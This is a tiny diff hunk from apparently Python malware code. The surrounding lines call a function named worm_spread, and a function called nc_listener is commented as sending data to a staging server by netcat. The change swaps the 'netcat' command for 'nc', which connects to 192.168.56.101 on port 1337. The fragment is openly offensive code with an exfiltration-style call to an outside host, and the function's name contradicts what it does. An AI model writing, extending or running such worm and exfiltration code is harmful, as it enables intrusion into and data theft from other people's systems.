@@ -30,7 +30,7 @@ print(worm_spread())
 
 def nc_listener():
     #sending to staging server via netcat
-    subprocess.run(["netcat", "192.168.56.101", "1337"])
+    subprocess.run(["nc", "192.168.56.101", "1337"])
 print(nc_listener())
     
 
